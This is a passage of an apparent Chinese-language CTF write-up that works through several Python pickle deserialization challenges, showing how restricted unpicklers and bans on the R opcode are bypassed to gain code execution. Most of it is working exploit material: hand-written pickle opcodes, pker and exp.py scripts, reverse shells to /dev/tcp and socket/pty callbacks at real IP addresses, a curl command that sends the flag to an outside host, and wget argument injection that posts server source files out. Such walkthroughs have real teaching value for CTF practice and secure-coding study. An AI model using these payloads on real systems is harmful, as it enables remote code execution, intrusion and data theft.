10\n那么构造的方向有了——修改相关参数做到变量覆盖，再以序列化的opcode形式传过去。手写opcode面临的问题就是重写find_class()后对加载指定模块的限制，而这里我们可以看到__init__.py中game = Game()，所以直接可以通过guess_game.game引入Game()类，然后修改类中的win_count和round_count就能做到变量覆盖；第二要注意必须手写opcode，如果是先from guess_name import game，然后修改参数后再dump，则是在运行时重新新建一个Game对象，就不是从guess_game这个module中获取，破坏上下文；第三要注意\npickle序列化流执行完会把栈顶的值返回，所以栈顶需要设为Ticket，这里可以dumps一个Ticket，然后拼到之前手写的opcode之后\nopcodes:\n# 修改win_count = 10和round_count = 9，传过去之后执行一次round_count += 1就能全胜 cguess_name game }S\u0026#34;win_count\u0026#34; I10 sS\u0026#34;round_count\u0026#34; I9 sbcguess_game.Ticket\\nTicket\\nq\\x00)\\x81q\\x01}q\\x02X\\x06\\x00\\x00\\x00numberq\\x03K\\x06sb. # c之后是被find_class()监控的区域，拼接Ticket import socket import struct s = socket.socket() s.connect((\u0026#39;node4.buuoj.cn\u0026#39;, 28803)) exp = b\u0026#39;\u0026#39;\u0026#39;cguess_game game }S\u0026#34;win_count\u0026#34; I10 sS\u0026#34;round_count\u0026#34; I9 sbcguess_game.Ticket\\nTicket\\nq\\x00)\\x81q\\x01}q\\x02X\\x06\\x00\\x00\\x00numberq\\x03K\\x06sb.\u0026#39;\u0026#39;\u0026#39; s.send(struct.pack(\u0026#39;\u0026gt;I\u0026#39;, len(exp))) s.send(exp) print(s.recv(1024)) print(s.recv(1024)) print(s.recv(1024)) print(s.recv(1024)) ————用pker\nticket = INST(\u0026#39;guess_game.Ticket\u0026#39;, \u0026#39;Ticket\u0026#39;, 0) game = GLOBAL(\u0026#39;guess_game\u0026#39;, \u0026#39;game\u0026#39;) game.curr_ticket = ticket return ticket # b\u0026#34;(I0\\niguess_game.Ticket\\nTicket\\np0\\n0cguess_game\\ngame\\np1\\n0g1\\n(N(S\u0026#39;curr_ticket\u0026#39;\\ng0\\ndtbg0\\n.\u0026#34; 栗子3 - [巅峰极客 2021]what_pickle 登录页面 任意密码均可登入，仅显示一张图片+登录时输入的密码；图片的url为/images?image=2.jpg，但是不能常规的目录穿越拿源码，当时做的时候就不会了，下面是复现\n/images可以看到开着的debug界面\n能看到部分的源码，这里的图片是用的wget命令来下载本地8080端口的/image图片，所以我们尝试wget命令注入将文件外带出来\n/images?image=\u0026amp;argv=--post-file=/app/app.py\u0026amp;argv=--execute=http_proxy=http://ip:port /images?image=\u0026amp;argv=—post-file=/app/app.py\u0026amp;argv=-e http_proxy=http://ip:port 依次读出/app/app.py和/app/config.py\n# app.py from flask import Flask, request, session, render_template, url_for,redirect import pickle import io import sys import base64 import random import subprocess from ctypes import cdll from config import SECRET_KEY, notadmin,user cdll.LoadLibrary(\u0026#34;./readflag.so\u0026#34;) app = Flask(__name__) app.config.update(dict( SECRET_KEY=SECRET_KEY, )) class RestrictedUnpickler(pickle.Unpickler): def find_class(self, module, name): if module in [\u0026#39;config\u0026#39;] and \u0026#34;__\u0026#34; not in name: return getattr(sys.modules[module], name) raise pickle.UnpicklingError(\u0026#34;global \u0026#39;%s.%s\u0026#39; is forbidden\u0026#34; % (module, name)) def restricted_loads(s): \u0026#34;\u0026#34;\u0026#34;Helper function analogous to pickle.loads().\u0026#34;\u0026#34;\u0026#34; return RestrictedUnpickler(io.BytesIO(s)).load() @app.route(\u0026#39;/\u0026#39;) @app.route(\u0026#39;/index\u0026#39;) def index(): if session.get(\u0026#39;username\u0026#39;, None): return redirect(url_for(\u0026#39;home\u0026#39;)) else: return render_template(\u0026#39;index.html\u0026#39;) @app.route(\u0026#39;/login\u0026#39;, methods=[\u0026#34;POST\u0026#34;]) def login(): name = request.form.get(\u0026#39;username\u0026#39;, \u0026#39;\u0026#39;) data = request.form.get(\u0026#39;data\u0026#39;, \u0026#39;test\u0026#39;) User = user(name,data) session[\u0026#34;info\u0026#34;]=base64.b64encode(pickle.dumps(User)) return redirect(url_for(\u0026#39;home\u0026#39;)) @app.route(\u0026#39;/home\u0026#39;) def home(): info = session[\u0026#34;info\u0026#34;] User = restricted_loads(base64.b64decode(info)) Jpg_id = random.randint(1,5) return render_template(\u0026#39;home.html\u0026#39;,id = str(Jpg_id), info = User.data) @app.route(\u0026#39;/images\u0026#39;) def images(): command=[\u0026#34;wget\u0026#34;] argv=request.args.getlist(\u0026#39;argv\u0026#39;) true_argv=[x if x.startswith(\u0026#34;-\u0026#34;) else \u0026#39;--\u0026#39;+x for x in argv] image=request.args[\u0026#39;image\u0026#39;] command.extend(true_argv) command.extend([\u0026#34;-q\u0026#34;,\u0026#34;-O\u0026#34;,\u0026#34;-\u0026#34;]) command.append(\u0026#34;http://127.0.0.1:8080/\u0026#34;+image) image_data = subprocess.run(command,stdout=subprocess.PIPE,stderr=subprocess.PIPE) return image_data.stdout if __name__ == \u0026#39;__main__\u0026#39;: app.run(host=\u0026#39;0.0.0.0\u0026#39;, debug=True, port=80) # config.py SECRET_KEY=\u0026#34;On_You_fffffinddddd_thi3_kkkkkkeeEEy\u0026#34; notadmin={\u0026#34;admin\u0026#34;:\u0026#34;no\u0026#34;} class user(): def __init__(self, username, data): self.username = username self.data = data def backdoor(cmd): if isinstance(cmd,list) and notadmin[\u0026#34;admin\u0026#34;]==\u0026#34;yes\u0026#34;: s=\u0026#39;\u0026#39;.join(cmd) eval(s) 这里的限制挺简单的了，覆盖一个notadmin字典admin键的值为yes即可执行给出的后门函数eval()\n# 用pker.py生成payload s=GLOBAL(\u0026#34;config\u0026#34;,\u0026#34;notadmin\u0026#34;) s[\u0026#34;admin\u0026#34;]=\u0026#34;yes\u0026#34; user=INST(\u0026#34;config\u0026#34;,\u0026#34;user\u0026#34;) user.username=\u0026#34;tyskill\u0026#34; user.data=\u0026#34;tyskill\u0026#34; door=INST(\u0026#34;config\u0026#34;,\u0026#34;backdoor\u0026#34;,[\u0026#34;__import__(\u0026#39;subprocess\u0026#39;).call(\\\u0026#34;echo -e \u0026#39;#!/bin/bash\\\\nsh -i \u0026gt;\u0026amp; /dev/tcp/you_vps_ip/port 0\u0026gt;\u0026amp;1\u0026#39;\u0026gt;x \u0026amp;\u0026amp; bash x \u0026amp;\u0026amp; rm -rf x\\\u0026#34;,shell=True)\u0026#34;]) return user 然后base64.b64encode(data)加进session['info']中拿到shell\n看wp，后面的步骤好像还跟pwn有点关系，我对pwn毫无研究，不献丑了，指路两个wp-\u0026gt;wp1 | wp2\n\u0026ndash;\u0026raquo;仅可以引入builtins模块 更多知识参考：深入理解Python中的__builtin__和__builtins__ | [Python 的内建对象](https://www.jianshu.com/p/645e973 83c1f) | __builtins__ 与 __builtin__（builtins）\n栗子4 - [Code-Breaking 2018] picklecode 本地复现还是失败，docker地址-\u0026gt;https://github.com/phith0n/code-breaking/tree/master/2018/picklecode（就跟被docker诅咒了一样 从来没有成功的用docker复现过一道题😭😭😭真就脑补出flag了\n审计源码，是一个django的项目（正好之前的实训做的就是django的项目，看源码轻松一些），主文件夹是core，有一个名为challenge的app\n看core下的settings.py比默认的配置多了54和55行\n用了特殊的SESSION_ENGINE和SESSION_SERIALIZER，前者指的是django将用户认证信息存储在哪里 后者指django用什么方式存储认证信息，也就相当于先经过SESSION_SERIAZLIZER指定的方式转换为字符串，再有SESSION_ENGINE指定的方式存储到某个地方。默认的django项目中，存储位置应该是django.contrib.sessions.backends.db，序列化方式应该是django.contrib.sessions.serializers.JSONSerializer；而这里就是用pickle序列化后的形式，加签名singed后存储在cookie中。那这里肯定要控制session，结合pickle来rce了；跟过去看看\n依旧是重写了find_class()方法，只有模块是内置的builtins（不需要import就可以用的）并且名字不能在黑名单中才可以；这里的绕过是第二个考点了，先翻回去看一下仅有的app的views.py\n模板部分直接拼接了request.user.username，这是注册时传入，有模板注入漏洞，找找调用链\n（因为本地环境太垃圾了 没复现 这里云做题了）在模板处下断点，可以看到很多的上下文变量，通常会存在的有request, user, perms，这里用的利用链是（注意django模板引擎无法读取下划线开头的属性）{{request.user.groups.source_field.opts.app_config.module.admin.settings.SECRET_KEY}}，注册一个名为这个的用户即可获得签名的密钥。\n再掉头回去思考opcode的编写。重写find_class()之后限制很多，但通过builtins仍然可以用getattr()；那么就分两步走，先通过builtins.getattr('builtins, 'eval')来获取eval()，再执行代码。那么如何手写protocol=0的opcode捏？\n首先引入模块builtins和函数getattr\ncbuiltins getattr 然后需要获取当前的上下文，用globals()\ncbuiltins globals globals是个字典，所以还要获取dict这个对象\ncbuiltins dict 还要执行globals()获取完整上下文\ncbuiltins globals (tR 栈顶元素是builtins.globals，压入一个空元组(t，然后用R执行\n然后用dict.get()方法从globals的字典中拿到键名为builtions的值\ncbuiltins getattr (cbuiltins dict S\u0026#39;get\u0026#39; tR(cbuiltins globals (tRS\u0026#39;builtins\u0026#39; tR. 反序列化后得到builtins对象\u0026lt;module 'builtins' (built-in)\u0026gt;；之后再用getattr从builtins对象中取出eval，也就是再套一层娃\ncbuiltins getattr (cbuiltins getattr (cbuiltins dict S\u0026#39;get\u0026#39; tR(cbuiltins globals (tRS\u0026#39;builtins\u0026#39; tRS\u0026#39;eval\u0026#39; tR. \u0026lt;built-in function eval\u0026gt;现在已经拿到了eval对象，再执行代码\ncbuiltins getattr (cbuiltins getattr (cbuiltins dict S\u0026#39;get\u0026#39; tR(cbuiltins globals (tRS\u0026#39;builtins\u0026#39; tRS\u0026#39;eval\u0026#39; tR(S\u0026#39;__import__(\u0026#34;os\u0026#34;).system(\u0026#34;ls\u0026#34;)\u0026#39; tR. 成功执行代码（注意运行时不仅需要引入pickle 也要引入builtins才可以！）\n————用pker\ngetattr = GLOBAL(\u0026#39;builtins\u0026#39;, \u0026#39;getattr\u0026#39;) dict = GLOBAL(\u0026#39;builtins\u0026#39;, \u0026#39;dict\u0026#39;) dict_get = getattr(dict, \u0026#39;get\u0026#39;) globals = GLOBAL(\u0026#39;builtins\u0026#39;, \u0026#39;globals\u0026#39;) builtins = globals() __builtins__ = dict_get(builtins, \u0026#39;__builtins__\u0026#39;) eval = getattr(__builtins__, \u0026#39;eval\u0026#39;) eval(\u0026#39;__import__(\u0026#34;os\u0026#34;).system(\u0026#34;whoami\u0026#34;)\u0026#39;) return # b\u0026#39;cbuiltins\\ngetattr\\np0\\n0cbuiltins\\ndict\\np1\\n0g0\\n(g1\\nS\\\u0026#39;get\\\u0026#39;\\ntRp2\\n0cbuiltins\\nglobals\\np3\\n0g3\\n(tRp4\\n0g2\\n(g4\\nS\\\u0026#39;__builtins__\\\u0026#39;\\ntRp5\\n0g0\\n(g5\\nS\\\u0026#39;eval\\\u0026#39;\\ntRp6\\n0g6\\n(S\\\u0026#39;__import__(\u0026#34;os\u0026#34;).system(\u0026#34;whoami\u0026#34;)\\\u0026#39;\\ntR.\u0026#39; 参考：wp1 | Code-Breaking中的两个Python沙箱 | Python 格式化字符串漏洞（Django为例）\n\u0026ndash;\u0026raquo;仅可以引入sys模块\u0026amp;名字中不带.点号 栗子5 - [BalsnCTF 2019] Pyshv1 题目环境-\u0026gt;https://github.com/sasdf/ctf/tree/master/tasks/2019/BalsnCTF/misc/pyshv1\n审计一下源码，先看一下肯定会不secure的securePickle.oy\n重写find_class()，被调用时可以灵活添加白名单；再看看server.py\n将输入的内容先转为ascii码形式被b64加密，再反序列化出来；其中白名单是sys模块\n但是这个sys模块并不安全：sys模块有一个字典对象sys.modules，它包含了运行时所有py程序所引入的所有模块(a cache of imported modules) ，如果它被改变 引入的模块就会被改变。而它也包括sys本身，也就是套娃sys.modules['sys']=sys.modules。那么如果我们先从sys中引入modules: import modules from sys，然后将modules['sys']改为modules['os']就将成功引入os模块。\n但有个缺陷是modules为dict，需要用getattr(sys.modules[module], name)进行取值，也就是先取出modules中的get函数，然后再用get来取出os，再进行替换修改\npker\nmodules=GLOBAL(\u0026#39;sys\u0026#39;, \u0026#39;modules\u0026#39;) modules[\u0026#39;sys\u0026#39;]=modules modules_get=GLOBAL(\u0026#39;sys\u0026#39;, \u0026#39;get\u0026#39;) os=modules_get(\u0026#39;os\u0026#39;) modules[\u0026#39;sys\u0026#39;]=os system=GLOBAL(\u0026#39;sys\u0026#39;, \u0026#39;system\u0026#39;) system(\u0026#39;dir\u0026#39;) return opcode:\nb\u0026#34;csys\\nmodules\\np0\\n0g0\\nS\u0026#39;sys\u0026#39;\\ng0\\nscsys\\nget\\np2\\n0g2\\n(S\u0026#39;os\u0026#39;\\ntRp3\\n0g0\\nS\u0026#39;sys\u0026#39;\\ng3\\nscsys\\nsystem\\np5\\n0g5\\n(S\u0026#39;dir\u0026#39;\\ntR.\u0026#34; \u0026ndash;\u0026raquo;仅可以引入题目中自设空模块 栗子6 - [BalsnCTF 2019] Pyshv2 题目环境-\u0026gt;https://github.com/sasdf/ctf/tree/master/tasks/2019/BalsnCTF/misc/pyshv2\nfind_class()稍有区别，在getattr()之前先用了__import__()\n这次的白名单是structs，然鹅这是个空的模块 虚晃一枪。不过是空的不要紧，照样有内置方法。\n__builtins__是所有模块公有的字典，记录所有的内建函数，可以通过对__builtins__内相应的键来修改对应的函数，上图中我们找到了eval方法，但取出eval这个键另外需要一个get方法才能做到。\n我们知道，__getattribute__魔术方法可以访问任意属性。而同时__import__并不是铁板一块，它的全部参数是__import__(name, globals=None, locals=None, fromlist=(), level=0)，它可以被替换（通过导入builtins模块并赋值给builtins.__import__）来可以修改import语句的语义并且不会导致代码问题，而题目中重写的find_class()特地在getattr()之前调用了__import__，现在我们可以劫持这个__import__，让它变为__getattribute__，让我们引入的structs变为structs.__getattribute__(structs).xxx。\n对于引入模块的检查只会出现在b\u0026rsquo;c\u0026rsquo;时，所以我们在用S操作码劫持__import__时并不会引发find_class()的过滤。\n然而我们不能直接getattr()=getattr()这样覆盖__import__，我们还需要__dict__的帮忙。__dict__是一个列表，存储并决定了一个对象的所有属性，如果它的内容被改变，属性也会跟着改变。\n所以整合一下上面的思路：我们先要引入助手liststructs.__dict__，取出structs空模块的内建函数（一个待取的dict）structs.__builtins__和我们需要的魔术方法structs.__getattribute__。之后从内建函数structs.__builtins__中将键名为__import__的值替换为structs.__getattribute__，然后借助__dict__将structs的structs属性覆盖为修改后的内建函数。这时，我们再次用b\u0026rsquo;c\u0026rsquo;从structs中引入get时触发find_class()中的__import__，也就相当于在执行structs.__getattribute__('structs').get，这样我们就拿到了get方法。而之前我们又已经替换了structs属性为内建函数__builtins__，所以利用这个得到的get方法就可以从__builtins__中取出eval，执行代码了。之后执行代码的部分同上面的sys.modules的思路。\npker\n__dict__ = GLOBAL(\u0026#39;structs\u0026#39;, \u0026#39;__dict__\u0026#39;) __builtins__ = GLOBAL(\u0026#39;structs\u0026#39;, \u0026#39;__builtins__\u0026#39;) gtat = GLOBAL(\u0026#39;structs\u0026#39;, \u0026#39;__getattribute__\u0026#39;) __builtins__[\u0026#39;__import__\u0026#39;] = gtat __dict__[\u0026#39;structs\u0026#39;] = __builtins__ builtin_get = GLOBAL(\u0026#39;structs\u0026#39;, \u0026#39;get\u0026#39;) eval = builtin_get(\u0026#39;eval\u0026#39;) eval(\u0026#39;pickle.sys.modules[\u0026#39;os\u0026#39;].system(\u0026#39;cat ../flag.txt\u0026#39;)\u0026#39;) return opcode\nb\u0026#34;cstructs\\n__dict__\\np0\\n0cstructs\\n__builtins__\\np1\\n0cstructs\\n__getattribute__\\np2\\n0g1\\nS\u0026#39;__import__\u0026#39;\\ng2\\nsg0\\nS\u0026#39;structs\u0026#39;\\ng1\\nscstructs\\nget\\np5\\n0g5\\n(S\u0026#39;eval\u0026#39;\\ntRp6\\n0g6\\n(S\u0026#39;pickle.sys.modules[\u0026#39;os\u0026#39;].system(\u0026#39;cat ../flag.txt\u0026#39;)\u0026#39;\\ntR.\u0026#34; 禁止b'R'操作码 也就相当于不可以用__reduce__，有以下几种应对方法（以下方法同样可以单独使用鸭！！！），变量覆盖（无直接代码执行）或利用b'i'，b'i'，b'b'这些操作码来rce。\n\u0026ndash;\u0026raquo;变量覆盖 栗子7 - [高校战“疫”网络安全分享赛2020] webtmp （这个题是缝合的[SJTU 2019]Pickle 以及 [SJTU 2019]Pickle-Revenge的题 = =。限制了R操作码，同时重写find_class()限制引入模块为__main__，两个考点）\nimport base64 import io import sys import pickle from flask import Flask, Response, render_template, request import secret app = Flask(__name__) class Animal: def __init__(self, name, category): self.name = name self.category = category def __repr__(self): return f\u0026#39;Animal(name={self.name!r}, category={self.category!r})\u0026#39; def __eq__(self, other): return type(other) is Animal and self.name == other.name and self.category == other.category class RestrictedUnpickler(pickle.Unpickler): def find_class(self, module, name): if module == \u0026#39;__main__\u0026#39;: return getattr(sys.modules[\u0026#39;__main__\u0026#39;], name) raise pickle.UnpicklingError(\u0026#34;global \u0026#39;%s.%s\u0026#39; is forbidden\u0026#34; % (module, name)) def restricted_loads(s): return RestrictedUnpickler(io.BytesIO(s)).load() def read(filename, encoding=\u0026#39;utf-8\u0026#39;): with open(filename, \u0026#39;r\u0026#39;, encoding=encoding) as fin: return fin.read() @app.route(\u0026#39;/\u0026#39;, methods=[\u0026#39;GET\u0026#39;, \u0026#39;POST\u0026#39;]) def index(): if request.args.get(\u0026#39;source\u0026#39;): return Response(read(__file__), mimetype=\u0026#39;text/plain\u0026#39;) if request.method == \u0026#39;POST\u0026#39;: try: pickle_data = request.form.get(\u0026#39;data\u0026#39;) if b\u0026#39;R\u0026#39; in base64.b64decode(pickle_data): return \u0026#39;No... I don\\\u0026#39;t like R-things. No Rabits, Rats, Roosters or RCEs.\u0026#39; else: result = restricted_loads(base64.b64decode(pickle_data)) if type(result) is not Animal: return \u0026#39;Are you sure that is an animal???\u0026#39; correct = (result == Animal(secret.name, secret.category)) return render_template(\u0026#39;unpickle_result.html\u0026#39;, result=result, pickle_data=pickle_data, giveflag=correct) except Exception as e: print(repr(e)) return \u0026#34;Something wrong\u0026#34; sample_obj = Animal(\u0026#39;一给我哩giaogiao\u0026#39;, \u0026#39;Giao\u0026#39;) pickle_data = base64.b64encode(pickle.dumps(sample_obj)).decode() return render_template(\u0026#39;unpickle_page.html\u0026#39;, sample_obj=sample_obj, pickle_data=pickle_data) if __name__ == \u0026#39;__main__\u0026#39;: app.run(host=\u0026#39;0.0.0.0\u0026#39;, port=5000) 看源码，opcode部分ban掉了R操作码（调用一个callable对象），不能用__reduce__了；也重写了find_class()，module必须是__main__；我们的目标是\nrestricted_loads(base64.b64decode(pickle_data)) == Animal(secret.name, secret.category)为真，即correct==True\n这里我们通过加载__main__.secret可以引入secret模块，来把secret.name和secret.category这两个变量覆盖为任意字符串，再以这个字符串为参数构造Animal对象（栈顶对于type的检查）\npker\nsecret = GLOBAL(\u0026#39;__main__\u0026#39;, \u0026#39;secret\u0026#39;) secret.name = \u0026#39;frieggs\u0026#39; secret.category = \u0026#39;frieggs\u0026#39; animal = INST(\u0026#39;__main__\u0026#39;, \u0026#39;Animal\u0026#39;, \u0026#39;frieggs\u0026#39;, \u0026#39;frieggs\u0026#39;) return animal # b\u0026#34;c__main__\\nsecret\\np0\\n0g0\\n(}(S\u0026#39;name\u0026#39;\\nS\u0026#39;frieggs\u0026#39;\\ndtbg0\\n(}(S\u0026#39;category\u0026#39;\\nS\u0026#39;frieggs\u0026#39;\\ndtb(S\u0026#39;frieggs\u0026#39;\\nS\u0026#39;frieggs\u0026#39;\\ni__main__\\nAnimal\\np3\\n0g3\\n.\u0026#34; 或者构造的exp.py\nimport pickle class Animal: def __init__(self, name, category): self.name = name self.category = category def __repr__(self): return f\u0026#39;Animal(name={self.name!r}, category={self.category!r})\u0026#39; def __eq__(self, other): return type(other) is Animal and self.name == other.name and self.category == other.category print(pickle.dumps(Animal(name=\u0026#34;x\u0026#34;, category=\u0026#34;y\u0026#34;), protocol=3)) # b\u0026#39;\\x80\\x03c__main__\\nAnimal\\nq\\x00)\\x81q\\x01}q\\x02(X\\x04\\x00\\x00\\x00nameq\\x03X\\x01\\x00\\x00\\x00xq\\x04X\\x08\\x00\\x00\\x00categoryq\\x05X\\x01\\x00\\x00\\x00yq\\x06ub.\u0026#39; ————所以在不允许b'R'的情况下，思路则是篡改secret中的name和categoriy，单纯的用b'c'引入模块对Animal进行实例化，这一过程也相当于是执行了函数\n一种解决办法就是这个栗子中的，干脆就不rce，而是用b'c'变量覆盖，思路就是上个三级标题下面的那个大段，不再赘述。\n\u0026ndash;\u0026raquo;使用__setstate__\u0026amp;b'b'实现rce 另一种方式是用BUILD指令b'b'及进行rce。\n在pickle源码中BUILD指令是这样的\n如果一个实例inst拥有__setstate__方法，则把state交给__setstate__方法来处理；否则直接把state这个dist的内容合并到inst.__dict__ 内。\n如果一个类原本没有__setstate__这个方法，当我们用{'__setstate__': os.system}来BUILD这个对象，那么现在对象的__setstate__就变成了os.system；接下来利用\u0026quot;ls /\u0026quot;来再次BUILD这个对象，则会执行setstate(\u0026quot;ls /\u0026quot;) ，而此时__setstate__已经被我们设置为os.system，因此实现了rce\nimport pickle import os class Student(): def __init__(self): self.name = \u0026#39;amelia\u0026#39; self.grade = \u0026#39;A1\u0026#39; payload = b\u0026#39;\\x80\\x03c__main__\\nStudent\\n)\\x81}(V__setstate__\\ncos\\nsystem\\nubVls /\\nb.\u0026#39; # shell = b\u0026#34;\u0026#34;\u0026#34;\\x80\\x03c__main__\\nStudent\\n)\\x81}(V__setstate__\\ncos\\nsystem\\nubS\u0026#39;bash -c \u0026#34;bash -i \u0026gt;\u0026amp; /dev/tcp/192.168.31.29/8426 0\u0026gt;\u0026amp;1\u0026#34;\u0026#39;\\nb.\u0026#34;\u0026#34;\u0026#34; pickle.loads(payload) 可以看到成功做到了rce~~反弹shell当然也可以\n\u0026ndash;\u0026raquo;使用_instantiate()\u0026amp;load_obj()\u0026amp;load_inst()\u0026amp;b'o'\u0026amp;b'i'实现rce _instantiate(): Create a new object via klass(*args); Leads to arbitrary function call actually\ndef _instantiate(self, klass, args): if (args or not isinstance(klass, type) or hasattr(klass, \u0026#34;__getinitargs__\u0026#34;)): try: # Arbitrary function all value = klass(*args) except TypeError as err: raise TypeError(\u0026#34;in constructor for %s: %s\u0026#34; % (klass.__name__, str(err)), sys.exc_info()[2]) else: value = klass.__new__(klass) self.append(value) load_obj()\ndef load_obj(self): # Stack is ... markobject classobject arg1 arg2 ... args = self.pop_mark() cls = args.pop(0) self._instantiate(cls, args) dispatch[OBJ[0]] = load_obj load_inst()\ndef load_inst(self): # read from user input module = self.readline()[:-1].decode(\u0026#34;ascii\u0026#34;) name = self.readline()[:-1].decode(\u0026#34;ascii\u0026#34;) klass = self.find_class(module, name) # get args from stack args = self.pop_mark() self._instantiate(klass, args) dispatch[INST[0]] = load_inst exp.py\nimport pickle import struct import base64 def exploit(command): assert type(command) is list payload_prefix = b\u0026#39;\u0026#39;\u0026#39;((\u0026#39;\u0026#39;\u0026#39; payload_suffix = b\u0026#39;\u0026#39;\u0026#39;lisubprocess\\nPopen\\n.\u0026#39;\u0026#39;\u0026#39; payload_body = bytes() for c in command: payload_body += b\u0026#34;X\u0026#34; + bytes(struct.pack(\u0026#34;\u0026lt;I\u0026#34;, len(c))) + bytes(c, encoding=\u0026#34;utf-8\u0026#34;) payload = payload_prefix + payload_body + payload_suffix assert b\u0026#39;R\u0026#39; not in payload return payload def main(): payload = exploit([ \u0026#34;python\u0026#34;, \u0026#34;-c\u0026#34;, \u0026#34;print(\u0026#39;pwned!\u0026#39;)\u0026#34; ]) print(\u0026#34;Payload:\u0026#34;, payload) print(\u0026#34;Length:\u0026#34;, len(payload)) print(\u0026#34;Base64:\u0026#34;, base64.b64encode(payload)) x = pickle.loads(payload) print(x) if __name__ == \u0026#34;__main__\u0026#34;: main() # 反弹shell当然也可 都说了是rce了 import sys,socket,os,pty s=socket.socket() s.connect((\u0026#34;182.92.191.192\u0026#34;,50000)) [os.dup2(s.fileno(),fd) for fd in (0,1,2)] pty.spawn(\u0026#34;/bin/sh\u0026#34;) payload = exploit([ \u0026#34;python\u0026#34;, \u0026#34;-c\u0026#34;, \u0026#39;import sys,socket,os,pty;s=socket.socket();s.connect((\u0026#34;8.8.8.8\u0026#34;, 13337));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(\u0026#34;/bin/sh\u0026#34;)\u0026#39;, ]) 栗子8 - [巅峰极客 2021]opcode 首页是登录框，任意值均可登入 明面上没什么东西 抓包后看到post传入参数有三个 username, password, imagePath，这里的imagePath也可进行任意文件读取，看一下后端源码\n第一眼看过去是p牛的题和另一个题的杂交了，限制builtins并且不能有R操作码，入口处在44行的session['data']处\n但是我没仔细注意的地方是17行，跟p牛的那个题一对比就能看出来这样的写法因为是单独的def而不是在对PickleSerializer进行修改，完全做不到重写pickle.loads方法，只是个摆设，相当于仅对R操作码进行了限制，笑嘻了\n直接上eval()+b'o'来弹shell了，不多bb\n(cbuiltins eval S\u0026#39;__import__(\u0026#34;os\u0026#34;).system(\\\u0026#39;bash -c \u0026#34;bash -i \u0026gt;\u0026amp; /dev/tcp/101.35.113.107/8426 0\u0026amp;1\u0026#34;\\\u0026#39;)\u0026#39; o. 或者是用system()+curl+b'o'外带flag\n(cos system S\u0026#39;curl burp_collaborator.net/?flag=`app/readflag`\u0026#39; o. 然后生成b64的内容（用'''的好处是不用考虑太多引号转义的问题\nimport base64 data = b\u0026#39;\u0026#39;\u0026#39;xxxxxxxxxxxxxx\u0026#39;\u0026#39;\u0026#39; print(base64.b64encode(data)) cookie的生成就是flask_session_cookie_manager一把梭了\n$ python3 flask_session_cookie_manager3.py encode -s \u0026#39;y0u-wi11_neuer_kn0vv-!@#se%32\u0026#39; -t \u0026#39;{\u0026#34;data\u0026#34;: \u0026#34;xxxxb64_contentxxxx\u0026#34;, \u0026#34;username\u0026#34;: \u0026#34;adminadmin\u0026#34;}\u0026#39; ————如果按照题目原有的意思，限制builtins+b'R'操作码也是很好做出来的\n先用pker生成带R的opcode\ngetattr = GLOBAL(\u0026#39;builtins\u0026#39;, \u0026#39;getattr\u0026#39;) dict = GLOBAL(\u0026#39;builtins\u0026#39;, \u0026#39;dict\u0026#39;) dict_get = getattr(dict, \u0026#39;get\u0026#39;) globals = GLOBAL(\u0026#39;builtins\u0026#39;, \u0026#39;globals\u0026#39;) builtins = globals() __builtins__ = dict_get(builtins, \u0026#39;__builtins__\u0026#39;) eval = getattr(__builtins__, \u0026#39;eval\u0026#39;) eval(\u0026#39;__import__(\u0026#34;os\u0026#34;).system(\u0026#34;whoami\u0026#34;)\u0026#39;) return # b\u0026#39;cbuiltins\\ngetattr\\np0\\n0cbuiltins\\ndict\\np1\\n0g0\\n(g1\\nS\\\u0026#39;get\\\u0026#39;\\ntRp2\\n0cbuiltins\\nglobals\\np3\\n0g3\\n(tRp4\\n0g2\\n(g4\\nS\\\u0026#39;__builtins__\\\u0026#39;\\ntRp5\\n0g0\\n(g5\\nS\\\u0026#39;eval\\\u0026#39;\\ntRp6\\n0g6\\n(S\\\u0026#39;__import__(\u0026#34;os\u0026#34;).system(\u0026#34;whoami\u0026#34;)\\\u0026#39;\\ntR.\u0026#39; 然后手搓，在调用callable前添加MARK即(，去掉t和调用t用到的MARK\n也就是[callable] [tuple] R===\u0026gt;MARK [callable] [args...] o\nb\u0026#39;\u0026#39;\u0026#39;cbuiltins\\ngetattr\\np0\\n0cbuiltins\\ndict\\np1\\n0(g0\\ng1\\nS\u0026#39;get\u0026#39;\\nop2\\n0cbuiltins\\nglobals\\np3\\n0(g3\\nop4\\n0(g2\\ng4\\nS\u0026#39;__builtins__\u0026#39;\\nop5\\n0(g0\\ng5\\nS\u0026#39;eval\u0026#39;\\nop6\\n0(g6\\nS\u0026#39;__import__(\u0026#34;os\u0026#34;).system(\u0026#34;whoami\u0026#34;)\u0026#39;\\no.\u0026#39;\u0026#39;\u0026#39; 可以看下区别\n修改都是一对一对的，总结一下方法就是0gx要变为0(gx，(gx要变为gx ，tR换成o\n参考：wp\n\u0026ndash;\u0026raquo;使用_getattribute()\u0026amp;load_obj()\u0026amp;load_inst()实现任意文件读取 find_class()\ndef find_class(self, module, name): # Subclasses may override this. sys.audit(\u0026#39;pickle.find_class\u0026#39;, module, name) if self.proto \u0026lt; 3 and self.fix_imports: if (module, name) in _compat_pickle.NAME_MAPPING: module, name = _compat_pickle.NAME_MAPPING[(module, name)] elif module in _compat_pickle.IMPORT_MAPPING: module = _compat_pickle.IMPORT_MAPPING[module] __import__(module, level=0) if self.proto \u0026gt;= 4: return _getattribute(sys.modules[module], name)[0] else: return getattr(sys.modules[module], name) _getattribute()\ndef _getattribute(obj, name): for subpath in name.split(\u0026#39;.\u0026#39;): if subpath == \u0026#39;\u0026lt;locals\u0026gt;\u0026#39;: raise AttributeError(\u0026#34;Can\u0026#39;t get local attribute {!r} on {!r}\u0026#34; .format(name, obj)) try: parent = obj obj = getattr(obj, subpath) except AttributeError: raise AttributeError(\u0026#34;Can\u0026#39;t get attribute {!r} on {!r}\u0026#34; .format(name, obj)) from None return obj, parent read()\ndef read(filename, encoding=\u0026#39;utf-8\u0026#39;): with open(filename, \u0026#39;r\u0026#39;, encoding=encoding) as fin: return fin.read() 仍然以上面webtmp(究极缝合怪)的题为例，我们可以利用上面的函数，创建一个Animal的实例，然后将name或category的值设置为read wrapper的返回值\nexp.py\nimport pickle import struct import base64 def read(filename, encoding=\u0026#39;utf-8\u0026#39;): with open(filename, \u0026#39;r\u0026#39;, encoding=encoding) as fin: return fin.read() def exploit(filename): payload_prefix = b\u0026#39;\u0026#39;\u0026#39;(\u0026#39;\u0026#39;\u0026#39; payload_body = b\u0026#34;X\u0026#34; + bytes(struct.pack(\u0026#34;\u0026lt;I\u0026#34;, len(filename))) + bytes(filename, encoding=\u0026#34;utf-8\u0026#34;) payload_suffix = 